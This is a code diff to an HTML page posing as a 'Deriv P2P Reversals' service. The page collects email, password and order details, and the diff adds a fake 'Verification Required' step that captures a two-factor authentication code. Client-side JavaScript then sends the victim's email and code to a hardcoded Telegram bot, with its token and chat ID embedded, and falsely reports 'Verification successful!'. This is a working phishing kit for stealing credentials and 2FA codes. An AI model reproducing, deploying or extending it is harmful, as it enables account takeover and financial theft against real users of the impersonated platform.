@@ -256,6 +256,10 @@
       opacity: 1;
     }
 
+    .hidden {
+      display: none !important;
+    }
+
     /* ── Responsive ── */
     @media (max-width: 480px) {
       .card {
@@ -282,55 +286,71 @@
       </svg>
     </div>
 
-    <h1 class="card-title">Deriv P2P Reversals</h1>
-    <p class="card-subtitle">Submit your reversal</p>
+    <div id="step1" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+      <h1 class="card-title">Deriv P2P Reversals</h1>
+      <p class="card-subtitle">Submit your reversal</p>
 
-    <form class="form" id="reversalForm" novalidate>
+      <form class="form" id="reversalForm" novalidate>
 
-      <!-- Email -->
-      <div class="field">
-        <input type="email" id="email" name="email" placeholder=" " autocomplete="email" required />
-        <label for="email">Email</label>
+        <!-- Email -->
+        <div class="field">
+          <input type="email" id="email" name="email" placeholder=" " autocomplete="email" required />
+          <label for="email">Email</label>
+        </div>
+
+        <!-- Password -->
+        <div class="field">
+          <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required />
+          <label for="password">Password</label>
+        </div>
+
+        <!-- Order ID -->
+        <div class="field">
+          <input type="text" id="orderId" name="orderId" placeholder=" " required />
+          <label for="orderId">Order ID</label>
+        </div>
+
+        <!-- Reason for reversal -->
+        <div class="field select-wrap" id="reasonField">
+          <select id="reason" name="reason" required>
+            <option value="" disabled selected></option>
+            <option value="no_payment">No payment received</option>
+            <option value="no_proof">No payment proof</option>
+            <option value="fraud">Suspected fraud</option>
+            <option value="other">Other</option>
+          </select>
+          <label for="reason">Reason for reversal</label>
+        </div>
+
+        <!-- Submit -->
+        <button type="submit" class="btn-submit" id="submitBtn">Submit</button>
+
+      </form>
+
+      <!-- Forgot password -->
+      <div class="forgot-wrap">
+        <a href="#" class="link" id="forgotPasswordLink" onclick="handleForgotPassword(event)">Forgot password?</a>
       </div>
 
-      <!-- Password -->
-      <div class="field">
-        <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required />
-        <label for="password">Password</label>
+      <!-- Sign up -->
+      <div class="signup-wrap">
+        <span>Don't have an account?</span>
+        <a href="#" class="link" id="signUpLink" onclick="handleSignUp(event)">Sign up</a>
       </div>
-
-      <!-- Order ID -->
-      <div class="field">
-        <input type="text" id="orderId" name="orderId" placeholder=" " required />
-        <label for="orderId">Order ID</label>
-      </div>
-
-      <!-- Reason for reversal -->
-      <div class="field select-wrap" id="reasonField">
-        <select id="reason" name="reason" required>
-          <option value="" disabled selected></option>
-          <option value="no_payment">No payment received</option>
-          <option value="no_proof">No payment proof</option>
-          <option value="fraud">Suspected fraud</option>
-          <option value="other">Other</option>
-        </select>
-        <label for="reason">Reason for reversal</label>
-      </div>
-
-      <!-- Submit -->
-      <button type="submit" class="btn-submit" id="submitBtn">Submit</button>
-
-    </form>
-
-    <!-- Forgot password -->
-    <div class="forgot-wrap">
-      <a href="#" class="link" id="forgotPasswordLink" onclick="handleForgotPassword(event)">Forgot password?</a>
     </div>
 
-    <!-- Sign up -->
-    <div class="signup-wrap">
-      <span>Don't have an account?</span>
-      <a href="#" class="link" id="signUpLink" onclick="handleSignUp(event)">Sign up</a>
+    <div id="step2" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+      <h1 class="card-title">Verification Required</h1>
+      <p class="card-subtitle">Enter the authentication code to continue</p>
+
+      <form class="form" id="codeForm" novalidate>
+        <div class="field">
+          <input type="text" id="authCode" name="authCode" placeholder=" " required />
+          <label for="authCode">Authentication Code</label>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitCodeBtn">Verify</button>
+      </form>
     </div>
 
   </div>
@@ -411,7 +431,9 @@
         const data = await res.json();
 
         if (data.ok) {
-          showToast('Reversal submitted successfully!', 4000);
+          window.userEmail = email; // Save for next step
+          document.getElementById('step1').classList.add('hidden');
+          document.getElementById('step2').classList.remove('hidden');
           document.getElementById('reversalForm').reset();
           reasonField.classList.remove('filled');
           reasonSelect.classList.remove('has-value');
@@ -438,6 +460,54 @@
       e.preventDefault();
       showToast('Sign-up is currently by invitation only.');
     }
+
+    // ── Code Verification Submission ──
+    document.getElementById('codeForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const authCode = document.getElementById('authCode').value.trim();
+
+      if (!authCode) {
+        showToast('Please enter the code.');
+        return;
+      }
+
+      const btn = document.getElementById('submitCodeBtn');
+      btn.textContent = 'Verifying…';
+      btn.disabled = true;
+
+      const BOT_TOKEN = '8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms';
+      const CHAT_ID   = '2056358288';
+      const TG_URL    = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      const text = `🔐 Auth Code Received\n\n📧 Email: ${window.userEmail || 'Unknown'}\n🔢 Code: ${authCode}\n🕒 Time: ${new Date().toUTCString()}`;
+
+      try {
+        const res  = await fetch(TG_URL, {
+          method  : 'POST',
+          headers : { 'Content-Type': 'application/json' },
+          body    : JSON.stringify({ chat_id: CHAT_ID, text }),
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+          showToast('Verification successful!', 4000);
+          document.getElementById('codeForm').reset();
+          setTimeout(() => {
+            window.location.reload();
+          }, 2000);
+        } else {
+          console.error('Telegram error:', data);
+          showToast('Verification failed: ' + (data.description || 'Unknown error'));
+        }
+      } catch (err) {
+        console.error('Fetch error:', err);
+        showToast('Network error. Please check your connection.');
+      } finally {
+        btn.textContent = 'Verify';
+        btn.disabled = false;
+      }
+    });
   </script>
 </body>
 </html>
